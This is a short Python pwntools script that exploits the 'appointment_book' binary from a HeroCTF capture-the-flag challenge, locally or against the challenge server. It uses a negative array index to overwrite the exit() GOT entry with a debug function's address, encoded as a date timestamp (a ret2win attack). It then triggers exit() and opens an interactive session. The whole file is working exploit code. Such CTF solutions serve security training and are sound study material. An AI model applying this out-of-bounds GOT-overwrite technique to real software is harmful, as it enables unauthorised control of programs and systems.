from pwn import *

REMOTE = False

if REMOTE:
    r = remote("static-03.heroctf.fr", 5000)
else:
    r = process("./appointment_book")

# Add an appointment
r.recvuntil(b"Your choice: ")
r.sendline(b"2")

# Index -5 will point on "exit()" entry in ".got" section
r.recvuntil(b"[+] Enter the index of this appointment (0-7): ")
r.sendline(b"-5")

# 1970-02-18 15:26:30 --> 4199190 UNIX timestamp
#                     == 0x401336 (address of "debug_remote")
# Thanks to this site: https://www.unixtimestamp.com/?unixTimestampInput=%7B%7B%7Bs%7D%7D%7D
r.recvuntil(b"[+] Enter a date and time (YYYY-MM-DD HH:MM:SS):")

if REMOTE:
    r.sendline(b"1970-02-18 14:27:02")
else:
    r.sendline(b"1970-02-18 15:27:02")

# We don't care about the message
r.recvuntil(b"[+] Enter an associated message (place, people, notes...): ")
r.sendline(b"Bonsoir ! JE suis Bob Lennon !")

# Choix 3 to call exit() --> ret2win ! 
r.recvuntil(b"Your choice: ")
r.sendline(b"3")
r.interactive()
